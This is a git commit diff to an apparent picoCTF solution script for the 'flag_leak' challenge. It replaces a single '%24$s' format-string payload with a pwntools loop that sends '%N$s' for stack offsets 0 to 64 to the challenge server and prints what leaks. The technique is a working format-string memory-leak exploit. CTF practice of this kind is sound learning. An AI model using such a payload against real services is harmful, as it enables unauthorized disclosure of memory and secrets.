a9cd7bf49fc78d912b0ea16a0cf9aaab97c17fec
kdooley <kdooley3@nd.edu>
2025-08-25 13:10:37 -0400

    fix flag_leak

--- picoCTF/binex/flag_leak/flag_leak.py
+++ picoCTF/binex/flag_leak/flag_leak.py
@@ -1,13 +1,13 @@
 from pwn import *
 
-p = remote("saturn.picoctf.net", 61218)
 
+for i in range(65):
+    p = remote("saturn.picoctf.net", 63879)
+    p.recvuntil('> ')
 
+    payload = "%"+str(i)+"$s"
+    p.sendline(payload)
+    s = p.recv().decode('latin-1')
+    print(i,s)
 
-payload = b"%24$s"
-p.sendline(payload)
-
-
-
-s = p.recvall().decode('latin-1')
-print(s)
+    p.close()
